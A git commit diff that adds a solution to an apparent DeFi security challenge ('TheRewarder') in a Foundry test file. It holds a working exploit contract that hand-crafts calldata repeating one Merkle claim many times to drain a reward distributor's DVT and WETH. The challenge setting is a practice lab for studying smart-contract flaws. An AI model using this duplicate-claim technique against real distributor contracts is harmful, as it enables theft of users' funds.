8764b6db6c9b8bbf7081a4b4eccb4ec93a17a6ca
GianfrancoBazzani <bazzanigianfranco@gmail.com>
2025-03-17 10:50:40 +0100

    :tea: test: add TheRewarder solution

--- test/the-rewarder/TheRewarder.t.sol
+++ test/the-rewarder/TheRewarder.t.sol
@@ -115,6 +115,46 @@ contract TheRewarderChallenge is Test {
         vm.stopPrank(); // stop alice prank
 
         vm.stopPrank(); // stop deployer prank
+
+        // Alice Claim calldata
+        // 0000000000000000000000000000000000000000000000000000000000000040
+        // 0000000000000000000000000000000000000000000000000000000000000460
+        // 0000000000000000000000000000000000000000000000000000000000000002
+        // 0000000000000000000000000000000000000000000000000000000000000040
+        // 0000000000000000000000000000000000000000000000000000000000000220
+        // 0000000000000000000000000000000000000000000000000000000000000000 <- inputClaims[0]
+        // 0000000000000000000000000000000000000000000000000008e393f2dda4b9
+        // 0000000000000000000000000000000000000000000000000000000000000000
+        // 0000000000000000000000000000000000000000000000000000000000000080
+        // 000000000000000000000000000000000000000000000000000000000000000a
+        // 925450a3cfe3826ad85358e2b3df638edc7c8553b6faee9e40fd9c6e9e3a3e04
+        // f262e0db29c13826883ed5262d51ad286f1bd627b4632141534c6cb80f01f430
+        // 5ad8d27e776667615f79b7c7be79980ac8352518ca274a8ed68a9953ee4302d5
+        // d46184e60f75d45ddc7e58268d69fd5db6db0d781f1ebe2d408171d934d71bb5
+        // fc8d72c7d5651be4af071dde376da5a9b14c872ee135517f5bceb5fddde0571f
+        // fe6633d564f231dc71240b67d3846287e5c493602daf3c4a76b1779bba602d00
+        // b0835f3ca4e3a13f76360a37e3fabcf64cb8aafbbd0c692e65351dc8cd4819a6
+        // c1f40848cc540c3073bbe8750cefb26bc61b2feeb1be4dbfb9232c5ba75c063c
+        // af14765a88572c5fa47538298e056f8e4a93c2541ffae79e7c56cae228c7b1aa
+        // 9a84465e61afcf8d20079181aacdfe51b56043d42704ca054bf6edd4bb89e35d
+        // 0000000000000000000000000000000000000000000000000000000000000000 <- inputClaims[1]
+        // 0000000000000000000000000000000000000000000000000000cfb68ee14fe1
+        // 0000000000000000000000000000000000000000000000000000000000000001
+        // 0000000000000000000000000000000000000000000000000000000000000080
+        // 000000000000000000000000000000000000000000000000000000000000000a
+        // 7217ae40b137a0d9d7179ef8bb0d0a0a8002dc6fefed8e9faa17b29bc037b747
+        // fdad7418265f24fd2100fbcde33a22785f151aa01ab26aefd76c58bbfa0a9592
+        // 0be25e66daab92e7052e6c307ae4743bba49ae08c7324acbc3eb730f51b991e0
+        // adadec0d619c83cc423e98ce2941c5187afad0ae7fec5a0be2f2d4fd5ce201c0
+        // 1d58844cf7ba4907999bec4dc9a13850a6003dd4517757787da73d04e36f04a6
+        // ee506e770834eec054770f7db27f9f91ce06266a85e91d9c86ed05d36d0998d1
+        // 77d72ce81593c2886d9283aa6504a920bc1778570cfb72dc7dbed917ff37e75f
+        // ad067afa65ca297c66e2ff24ce4d2acb8b08c61a7885c22ac9c59dd3d421a993
+        // 3ab504a41eab2e0bdb86f5ccc8a9f883bceaf7676ef4102ab83ce3fe7f59086d
+        // ea7701394795b5593132551c121f2fd3675988317294c66cb946a30eefcfe052
+        // 0000000000000000000000000000000000000000000000000000000000000002
+        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b <- inputTokens[0]
+        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264 <- inputTokens[1]
     }
 
     /**
@@ -148,7 +188,27 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Deploy malicious data builder
+        MaliciousDataBuilder maliciousDataBuilder = new MaliciousDataBuilder();
+
+        uint256  playerDvtAmount = 11524763827831882;
+        uint256 playerWethAmount = 1171088749244340;
+
+        // Player claims
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        bytes memory dataDvt = maliciousDataBuilder.buildMaliciousData(distributor, playerDvtAmount, player, address(dvt), merkle, dvtLeaves);
+        bytes memory dataWeth = maliciousDataBuilder.buildMaliciousData(distributor, playerWethAmount, player, address(weth), merkle, wethLeaves);
+
+        // Drain distributor
+        (bool result , ) = address(distributor).call(dataDvt);
+        assertTrue(result, "DVT drain claim failed");
+        (result , ) = address(distributor).call(dataWeth);
+        assertTrue(result, "WETH drain claim failed");
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -187,5 +247,55 @@ contract TheRewarderChallenge is Test {
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
         }
+    }
+}
+
+
+contract MaliciousDataBuilder {
+    function buildMaliciousData(TheRewarderDistributor distributor, uint256 amount, address beneficiary, address token, Merkle merkle, bytes32[] memory leaves) external returns (bytes memory data) {
+        // Get Index
+        bytes32 beneficiaryLeaf = keccak256(abi.encodePacked(beneficiary, amount));
+        uint256 beneficiaryIndex; 
+        for (uint256 i = 0 ; i < leaves.length; i ++) {
+            if (leaves[i] == beneficiaryLeaf) {
+                beneficiaryIndex = i;
+            }
+        }
+
+        // Claim 
+        Claim memory beneficiaryClaim = Claim({
+            batchNumber: 0, 
+            amount: amount,
+            tokenIndex: 0, 
+            proof: merkle.getProof(leaves, beneficiaryIndex)
+        });
+
+        // Compute the required loops
+        uint256 loops = distributor.getRemaining(token) / amount;
+
+        // Malicious calldata dvt
+        // function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens);
+        data = abi.encodePacked(
+            TheRewarderDistributor.claimRewards.selector, // selector
+            bytes32(uint256(64)), // Offset of Claim[]
+            bytes32(0x60 + 0x20 * loops + 0x20 * 15), // Offset of IERC20[] 15 is the # of words of the claim abi coded
+            bytes32(loops) // Length of Claim[]
+        );
+        // To optimize calldata we reuse the same claim by setting the same offset in all elements of the claim array
+        for (uint256 i = 0; i< loops; i++) {
+            data = bytes.concat(data, bytes32(loops * 0x20)); // Offset of the Claim in Claim[]
+        }
+        bytes memory beneficiaryClaimData = abi.encode(beneficiaryClaim);
+        for (uint256 i = 0x40; i <= beneficiaryClaimData.length; i = i + 0x20) {
+            bytes32 _bytes;
+            assembly {
+                _bytes := mload(add(beneficiaryClaimData, i))
+            }
+            data = bytes.concat(data, bytes32(_bytes));
+        }
+        // IERC20[] array
+        data = bytes.concat(data, bytes32(uint256(1))); // IERC20[] len is 1
+        data = bytes.concat(data, bytes32(uint256(uint160(address(token))))); // dvt address
+
     }
 }
